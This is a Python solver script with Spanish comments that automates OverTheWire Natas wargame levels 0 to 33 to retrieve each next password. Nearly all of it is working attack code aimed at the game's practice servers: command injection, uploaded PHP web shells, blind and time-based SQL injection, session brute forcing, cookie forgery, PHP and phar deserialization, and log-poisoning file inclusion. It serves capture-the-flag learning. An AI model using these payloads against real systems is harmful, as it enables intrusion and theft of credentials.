#!/usr/bin/env python3
"""
Resuelve automáticamente un nivel de Natas (OverTheWire) y obtiene la
contraseña del nivel siguiente, reproduciendo la técnica descrita en el
writeup de ese nivel (levels/levelNN/README.md).

Uso:
    python3 scripts/solve_level.py --level N [--password XXX] [--all]

  --level N       Nivel de partida (0-33). Resuelve natasN -> obtiene la
                   contraseña de natas(N+1).
  --password XXX  Contraseña de natasN. Si se omite, se busca en
                   scripts/passwords.json (donde queda guardada
                   automáticamente cada contraseña que se va obteniendo).
  --all           Resuelve en cadena todos los niveles desde --level (o desde
                   el primero pendiente en passwords.json) hasta el 33.

Requiere: `pip install requests` (o el entorno de Python del sistema si ya
lo tiene disponible). El nivel 33 además invoca el binario `php` local
(instalado, p. ej., con `brew install php`) para generar un .phar.

No usa ninguna librería de terceros para SSH/expect (a diferencia de
bandit_run.sh): todo el juego es HTTP, así que basta con `requests`.
"""
import argparse
import base64
import html
import io
import os
import re
import subprocess
import sys
import tempfile
import time

import requests

# El wargame corre en un servidor compartido por todos los jugadores: si en un
# momento dado hay mucha carga, una petición puede quedarse colgada sin dar
# ningún error. `requests` no aplica ningún timeout por defecto, así que sin
# esto un simple pico de latencia podía dejar el script esperando para
# siempre. Se parchea una vez, al importar, para que TODA llamada
# (requests.get/post sueltas o vía Session) tenga un timeout razonable salvo
# que el propio código ya pida uno explícito.
_DEFAULT_TIMEOUT = 20
_orig_request = requests.Session.request


def _request_with_default_timeout(self, method, url, **kwargs):
    kwargs.setdefault("timeout", _DEFAULT_TIMEOUT)
    return _orig_request(self, method, url, **kwargs)


requests.Session.request = _request_with_default_timeout

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PASSWORDS_FILE = os.path.join(SCRIPT_DIR, "passwords.json")
LAST_LEVEL = 33  # resolver natas33 da la contraseña de natas34 (nivel final, sin reto)

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PW_RE = re.compile(r"[A-Za-z0-9]{32}")


# --------------------------------------------------------------------------- helpers

def load_passwords():
    import json
    if os.path.exists(PASSWORDS_FILE):
        with open(PASSWORDS_FILE) as f:
            return json.load(f)
    return {"0": "natas0"}


def save_passwords(d):
    import json
    with open(PASSWORDS_FILE, "w") as f:
        json.dump(d, f, indent=2, sort_keys=True)
    os.chmod(PASSWORDS_FILE, 0o600)


def base_url(level, path=""):
    return f"http://natas{level}.natas.labs.overthewire.org{path}"


def creds(level, password):
    return (f"natas{level}", password)


def pre_block(text):
    m = re.search(r"<pre>(.*?)</pre>", text, re.DOTALL)
    return m.group(1) if m else text


def strip_tags(text):
    """Quita etiquetas HTML y decodifica entidades (&nbsp;, &amp;, ...) — útil
    para las vistas 'View sourcecode' con highlight_string(), que envuelven
    cada token en <span> y sustituyen espacios por &nbsp;."""
    return html.unescape(re.sub(r"<[^>]+>", "", text))


def first_pw(text, exclude=None):
    """Devuelve la primera cadena de 32 alfanuméricos que NO sea `exclude`
    (para no confundir la propia contraseña del nivel actual, visible en el
    <script>wechallinfo</script> de cualquier página, con la del siguiente)."""
    for m in PW_RE.finditer(text):
        if m.group(0) != exclude:
            return m.group(0)
    raise RuntimeError(f"no se encontró una contraseña de 32 caracteres (!= {exclude!r}) en: {text[:300]!r}")


# --------------------------------------------------------------------------- solvers
# Cada solve_NN(pw) recibe la contraseña de natasNN y devuelve la de natas(NN+1).

def solve_00(pw):
    r = requests.get(base_url(0, "/"), auth=creds(0, pw))
    return re.search(r"password for natas1 is ([A-Za-z0-9]+)", r.text).group(1)


def solve_01(pw):
    r = requests.get(base_url(1, "/"), auth=creds(1, pw))
    return re.search(r"password for natas2 is ([A-Za-z0-9]+)", r.text).group(1)


def solve_02(pw):
    r = requests.get(base_url(2, "/files/users.txt"), auth=creds(2, pw))
    return re.search(r"natas3:(\S+)", r.text).group(1)


def solve_03(pw):
    r = requests.get(base_url(3, "/robots.txt"), auth=creds(3, pw))
    path = re.search(r"Disallow:\s*(\S+)", r.text).group(1)
    r2 = requests.get(base_url(3, path + "users.txt"), auth=creds(3, pw))
    return re.search(r"natas4:(\S+)", r2.text).group(1)


def solve_04(pw):
    r = requests.get(base_url(4, "/"), auth=creds(4, pw),
                      headers={"Referer": "http://natas5.natas.labs.overthewire.org/"})
    return re.search(r"password for natas5 is ([A-Za-z0-9]+)", r.text).group(1)


def solve_05(pw):
    r = requests.get(base_url(5, "/"), auth=creds(5, pw), cookies={"loggedin": "1"})
    return re.search(r"password for natas6 is ([A-Za-z0-9]+)", r.text).group(1)


def solve_06(pw):
    r = requests.get(base_url(6, "/includes/secret.inc"), auth=creds(6, pw))
    secret = re.search(r'\$secret\s*=\s*"([^"]+)"', r.text).group(1)
    r2 = requests.post(base_url(6, "/index.php"), auth=creds(6, pw),
                        data={"submit": "1", "secret": secret})
    return re.search(r"password for natas7 is ([A-Za-z0-9]+)", r2.text).group(1)


def solve_07(pw):
    r = requests.get(base_url(7, "/index.php"), auth=creds(7, pw),
                      params={"page": "/etc/natas_webpass/natas8"})
    return first_pw(r.text, exclude=pw)


def solve_08(pw):
    r = requests.get(base_url(8, "/index-source.html"), auth=creds(8, pw))
    h = re.search(r'encodedSecret\s*=\s*"([0-9a-f]+)"', strip_tags(r.text)).group(1)
    secret = base64.b64decode(bytes.fromhex(h).decode()[::-1]).decode()
    r2 = requests.post(base_url(8, "/index.php"), auth=creds(8, pw),
                        data={"submit": "1", "secret": secret})
    return re.search(r"password for natas9 is ([A-Za-z0-9]+)", r2.text).group(1)


def solve_09(pw):
    payload = "nomatch; cat /etc/natas_webpass/natas10 #"
    r = requests.get(base_url(9, "/index.php"), auth=creds(9, pw), params={"needle": payload})
    return first_pw(pre_block(r.text), exclude=pw)


def solve_10(pw):
    payload = "nomatch\ncat /etc/natas_webpass/natas11 #"
    r = requests.get(base_url(10, "/index.php"), auth=creds(10, pw), params={"needle": payload})
    return first_pw(pre_block(r.text), exclude=pw)


def _xor_key_period(key_bytes):
    """La clave XOR es corta y se repite; el keystream derivado tiene la
    misma longitud que el plaintext conocido, así que hay que encontrar su
    período real (el ciclo más corto) antes de reutilizarlo para cifrar un
    texto de OTRA longitud — si no, el módulo se calcula mal en cuanto el
    nuevo texto es más largo que el original."""
    n = len(key_bytes)
    for period in range(1, n + 1):
        if all(key_bytes[i] == key_bytes[i % period] for i in range(n)):
            return key_bytes[:period]
    return key_bytes


def solve_11(pw):
    r = requests.get(base_url(11, "/"), auth=creds(11, pw))
    cookie_b64 = r.cookies.get("data")
    cipher = base64.b64decode(requests.utils.unquote(cookie_b64))
    known_plain = b'{"showpassword":"no","bgcolor":"#ffffff"}'
    raw_key = bytes(c ^ p for c, p in zip(cipher, known_plain))
    key = _xor_key_period(raw_key)
    plain = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
    out = bytes(p ^ key[i % len(key)] for i, p in enumerate(plain))
    new_cookie = base64.b64encode(out).decode()
    r2 = requests.get(base_url(11, "/"), auth=creds(11, pw),
                       cookies={"data": requests.utils.quote(new_cookie)})
    return re.search(r"password for natas12 is ([A-Za-z0-9]+)", r2.text).group(1)


def _upload_shell(level, pw, filename, content, next_level):
    r = requests.post(
        base_url(level, "/index.php"), auth=creds(level, pw),
        data={"filename": filename, "MAX_FILE_SIZE": "1000"},
        files={"uploadedfile": (filename, content)},
    )
    m = re.search(r'href="(upload/[^"]+)"', r.text)
    r2 = requests.get(base_url(level, "/" + m.group(1)), auth=creds(level, pw))
    return first_pw(r2.text, exclude=pw)


def solve_12(pw):
    content = b'<?php passthru("cat /etc/natas_webpass/natas13"); ?>'
    return _upload_shell(12, pw, "shell.php", content, 13)


def solve_13(pw):
    content = b'GIF89a;\n<?php passthru("cat /etc/natas_webpass/natas14"); ?>'
    return _upload_shell(13, pw, "shell.php", content, 14)


def solve_14(pw):
    r = requests.post(base_url(14, "/index.php"), auth=creds(14, pw),
                       data={"username": '" or "1"="1', "password": '" or "1"="1'})
    return re.search(r"password for natas15 is ([A-Za-z0-9]+)", r.text).group(1)


def solve_15(pw):
    sess = requests.Session()
    auth = creds(15, pw)
    url = base_url(15, "/index.php")

    def exists(payload):
        r = sess.post(url, auth=auth, data={"username": payload})
        return "This user exists" in r.text

    password = ""
    for pos in range(1, 33):
        for c in CHARSET:
            if exists(f'natas16" AND BINARY SUBSTRING(password,{pos},1)="{c}'):
                password += c
                break
        else:
            raise RuntimeError(f"no se encontró carácter en la posición {pos}")
    return password


def solve_16(pw):
    sess = requests.Session()
    auth = creds(16, pw)
    url = base_url(16, "/index.php")

    def check(pos, ch):
        script = (f"x=$(cat /etc/natas_webpass/natas17)\n"
                  f"c=$(expr substr $x {pos} 1)\n"
                  f"if [ $c = {ch} ]\nthen\necho aardvark\nelse\necho zzznomatchzzz\nfi")
        needle = "$(\n" + script + "\n)"
        r = sess.get(url, auth=auth, params={"needle": needle}, timeout=15)
        return "aardvark" in r.text

    password = ""
    for pos in range(1, 33):
        for c in CHARSET:
            if check(pos, c):
                password += c
                break
        else:
            raise RuntimeError(f"no se encontró carácter en la posición {pos}")
    return password


def solve_17(pw):
    sess = requests.Session()
    auth = creds(17, pw)
    url = base_url(17, "/index.php")

    def timed_request(pos, ch):
        payload = (f'nonexist" UNION SELECT '
                   f'SLEEP(2*(BINARY SUBSTRING(password,{pos},1)="{ch}")),2 '
                   f'FROM users WHERE username="natas18"-- -')
        t0 = time.time()
        sess.post(url, auth=auth, data={"username": payload}, timeout=15)
        return time.time() - t0

    def is_true(pos, ch):
        # el jitter de red puede hacer que una petición "falsa" (sin SLEEP)
        # tarde más de 1.5s por casualidad; para no aceptar un falso positivo
        # que corrompería un carácter, solo se confirma si DOS mediciones
        # independientes coinciden en superar el umbral.
        if timed_request(pos, ch) <= 1.5:
            return False
        return timed_request(pos, ch) > 1.5

    password = ""
    for pos in range(1, 33):
        for c in CHARSET:
            if is_true(pos, c):
                password += c
                break
        else:
            raise RuntimeError(f"no se encontró carácter en la posición {pos}")
    return password


def solve_18(pw):
    auth = creds(18, pw)
    url = base_url(18, "/index.php")
    for i in range(1, 641):
        r = requests.get(url, auth=auth, cookies={"PHPSESSID": str(i)}, timeout=10)
        if "You are an admin" in r.text:
            return first_pw(r.text, exclude=pw)
    raise RuntimeError("no se encontró ninguna sesión con admin=1 en 1..640")


def solve_19(pw):
    auth = creds(19, pw)
    url = base_url(19, "/index.php")
    for i in range(1, 641):
        hexid = f"{i}-admin".encode().hex()
        r = requests.get(url, auth=auth, cookies={"PHPSESSID": hexid}, timeout=10)
        if "You are an admin" in r.text:
            return first_pw(r.text, exclude=pw)
    raise RuntimeError("no se encontró ninguna sesión admin-<N> con admin=1 en 1..640")


def solve_20(pw):
    auth = creds(20, pw)
    url = base_url(20, "/index.php")
    sess = requests.Session()
    sess.post(url, auth=auth, data={"name": "x\nadmin 1"})
    r2 = sess.get(url, auth=auth)
    return first_pw(r2.text, exclude=pw)


def solve_21(pw):
    auth = creds(21, pw)
    exp_url = base_url(21, "").replace("natas21.", "natas21-experimenter.") + "/index.php"
    r = requests.get(exp_url, auth=auth, params={"submit": "1", "admin": "1"})
    sid = r.cookies.get("PHPSESSID")
    r2 = requests.get(base_url(21, "/index.php"), auth=auth, cookies={"PHPSESSID": sid})
    return first_pw(r2.text, exclude=pw)


def solve_22(pw):
    # el bug es justamente que el body "prohibido" se envía junto a un header
    # Location sin exit(); si dejamos que requests siga la redirección
    # perdemos ese body y solo vemos la página limpia de destino.
    r = requests.get(base_url(22, "/index.php"), auth=creds(22, pw),
                      params={"revelio": "1"}, allow_redirects=False)
    return first_pw(r.text, exclude=pw)


def solve_23(pw):
    r = requests.get(base_url(23, "/index.php"), auth=creds(23, pw), params={"passwd": "11iloveyou"})
    return first_pw(r.text, exclude=pw)


def solve_24(pw):
    r = requests.get(base_url(24, "/index.php"), auth=creds(24, pw), params={"passwd[]": "x"})
    return first_pw(r.text, exclude=pw)


def solve_25(pw):
    auth = creds(25, pw)
    url = base_url(25, "/index.php")
    sess = requests.Session()
    sess.get(url, auth=auth)
    sid = sess.cookies.get("PHPSESSID")
    ua = '<?php passthru("cat /etc/natas_webpass/natas26"); ?>'
    sess.get(url, auth=auth, headers={"User-Agent": ua}, params={"lang": "../foo"})
    r = sess.get(url, auth=auth, params={"lang": f"....//logs/natas25_{sid}.log"})
    return first_pw(r.text, exclude=pw)


def solve_26(pw):
    auth = creds(26, pw)
    url = base_url(26, "/index.php")

    def priv(cls, prop):
        return f"\0{cls}\0{prop}"

    logfile = f"img/n26_solver_{int(time.time())}.php"
    exitmsg = '<?php passthru("cat /etc/natas_webpass/natas27"); ?>\n'
    props = [(priv("Logger", "logFile"), logfile),
             (priv("Logger", "initMsg"), "unused"),
             (priv("Logger", "exitMsg"), exitmsg)]
    body = "".join(f's:{len(k.encode())}:"{k}";s:{len(v.encode())}:"{v}";' for k, v in props)
    serialized = f'O:6:"Logger":{len(props)}:{{{body}}}'
    cookie = base64.b64encode(serialized.encode()).decode()

    requests.get(base_url(26, "/"), auth=auth,
                 cookies={"drawing": requests.utils.quote(cookie)})
    r = requests.get(base_url(26, "/" + logfile), auth=auth)
    return first_pw(r.text, exclude=pw)


def solve_27(pw):
    auth = creds(27, pw)
    url = base_url(27, "/index.php")
    reg_user = "natas28" + " " * 57 + "x"
    requests.post(url, auth=auth, data={"username": reg_user, "password": ""})
    login_user = "natas28" + " " * 57
    r = requests.post(url, auth=auth, data={"username": login_user, "password": ""})
    return first_pw(r.text, exclude=pw)


def _query_blob(redirect_url):
    from urllib.parse import urlparse, parse_qs, unquote
    qs = parse_qs(urlparse(redirect_url).query)
    return base64.b64decode(unquote(qs["query"][0]))


def solve_28(pw):
    auth = creds(28, pw)
    url = base_url(28, "/")
    session = requests.Session()
    block_size = 16

    injection = "a" * 9 + "' UNION SELECT password FROM users; #"
    blocks = (len(injection) - 10) // block_size
    if (len(injection) - 10) % block_size != 0:
        blocks += 1

    r = session.post(url, auth=auth, data={"query": injection})
    raw_inject = _query_blob(r.url)

    r = session.post(url, auth=auth, data={"query": "a" * 10})
    good_base = _query_blob(r.url)

    spliced = (good_base[:block_size * 3]
               + raw_inject[block_size * 3:block_size * 3 + (blocks * block_size)]
               + good_base[block_size * 3:])
    query_param = requests.utils.quote(base64.b64encode(spliced)).replace("/", "%2F")

    r = session.get(url + "search.php/?query=" + query_param, auth=auth)
    return first_pw(r.text, exclude=pw)


def solve_29(pw):
    auth = creds(29, pw)
    url = base_url(29, "/index.pl")
    payload = f'|cat /etc/na"tas_webpass/nat"as30\x00'
    r = requests.get(url, auth=auth, params={"file": payload})
    return first_pw(r.text, exclude=pw)


def solve_30(pw):
    auth = creds(30, pw)
    url = base_url(30, "/index.pl")
    data = [
        ("username", "natas31"),
        ("password", "1 OR username='natas31'"),
        ("password", "2"),
    ]
    r = requests.post(url, auth=auth, data=data)
    # el perl imprime "natas31<pass>" pegado, sin separador -> hay que anclar
    # la extracción al nombre de usuario para no capturar un desplazamiento
    # de 7 caracteres (el propio "natas31") dentro de la contraseña real.
    return re.search(r"natas31([A-Za-z0-9]{32})", r.text).group(1)


def solve_31(pw):
    auth = creds(31, pw)
    base = base_url(31, "/index.pl")
    url = base + "?/etc/natas_webpass/natas32"
    data = {"file": "ARGV"}
    files = {"file": ("x.csv", io.StringIO("a,b\n1,2\n"), "text/csv")}
    r = requests.post(url, auth=auth, data=data, files=files)
    return first_pw(r.text, exclude=pw)


def solve_32(pw):
    auth = creds(32, pw)
    base = base_url(32, "/index.pl")
    url = base + "?/var/www/natas/natas32/getpassword%20|"
    data = {"file": "ARGV"}
    files = {"file": ("x.csv", io.StringIO("a,b\n1,2\n"), "text/csv")}
    r = requests.post(url, auth=auth, data=data, files=files)
    return first_pw(r.text, exclude=pw)


def solve_33(pw):
    auth = creds(33, pw)
    url = base_url(33, "/index.php")

    with tempfile.TemporaryDirectory() as tmp:
        shell_path = os.path.join(tmp, "shell.php")
        with open(shell_path, "wb") as f:
            f.write(b'<?php system("cat /etc/natas_webpass/natas34"); ?>')
        with open(shell_path, "rb") as f:
            md5sum = __import__("hashlib").md5(f.read()).hexdigest()

        gen_php = os.path.join(tmp, "gen.php")
        phar_path = os.path.join(tmp, "x.phar")
        with open(gen_php, "w") as f:
            f.write(f"""<?php
class Executor {{
    private $filename = "shell.php";
    private $signature = "PLACEHOLDER";
    private $init = false;
}}
$e = new Executor();
$ref = new ReflectionClass($e);
$ref->getProperty('filename')->setValue($e, "shell.php");
$ref->getProperty('signature')->setValue($e, "{md5sum}");

@unlink("{phar_path}");
$phar = new Phar("{phar_path}");
$phar->startBuffering();
$phar->addFromString("test.txt", "hello");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($e);
$phar->stopBuffering();
""")
        subprocess.run(["php", "-d", "phar.readonly=0", gen_php],
                       check=True, capture_output=True)

        with open(shell_path, "rb") as f:
            requests.post(url, auth=auth, data={"filename": "shell.php"},
                          files={"uploadedfile": ("shell.php", f, "application/octet-stream")})
        with open(phar_path, "rb") as f:
            requests.post(url, auth=auth, data={"filename": "x.phar"},
                          files={"uploadedfile": ("x.phar", f, "application/octet-stream")})
        r = requests.post(
            url, auth=auth,
            data={"filename": "phar:///natas33/upload/x.phar/test.txt"},
            files={"uploadedfile": ("dummy.txt", io.BytesIO(b"dummy"), "text/plain")},
        )
        return first_pw(r.text, exclude=pw)


SOLVERS = {i: f for i, f in enumerate([
    solve_00, solve_01, solve_02, solve_03, solve_04, solve_05, solve_06, solve_07,
    solve_08, solve_09, solve_10, solve_11, solve_12, solve_13, solve_14, solve_15,
    solve_16, solve_17, solve_18, solve_19, solve_20, solve_21, solve_22, solve_23,
    solve_24, solve_25, solve_26, solve_27, solve_28, solve_29, solve_30, solve_31,
    solve_32, solve_33,
])}


# --------------------------------------------------------------------------- main

def solve_one(level, password, passwords, retries=2):
    print(f"[*] Resolviendo nivel {level} (natas{level})...")
    for attempt in range(retries + 1):
        try:
            next_pw = SOLVERS[level](password)
            break
        except requests.exceptions.RequestException as exc:
            if attempt == retries:
                raise
            print(f"[!] Error de red ({exc}); reintentando ({attempt + 1}/{retries})...")
            time.sleep(3)
    passwords[str(level + 1)] = next_pw
    save_passwords(passwords)
    print(f"[+] natas{level + 1} password: {next_pw}")
    return next_pw


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--level", type=int, required=True, help="nivel de partida (0-33)")
    ap.add_argument("--password", help="contraseña de ese nivel (si se omite, se busca en passwords.json)")
    ap.add_argument("--all", action="store_true", help="encadenar hasta el nivel 33")
    args = ap.parse_args()

    if not (0 <= args.level <= LAST_LEVEL):
        sys.exit(f"--level debe estar entre 0 y {LAST_LEVEL}")

    passwords = load_passwords()
    level = args.level
    password = args.password or passwords.get(str(level))
    if not password:
        sys.exit(f"No tengo la contraseña de natas{level}; pásala con --password.")
    passwords[str(level)] = password

    if args.all:
        while level <= LAST_LEVEL:
            password = solve_one(level, password, passwords)
            level += 1
    else:
        solve_one(level, password, passwords)


if __name__ == "__main__":
    main()
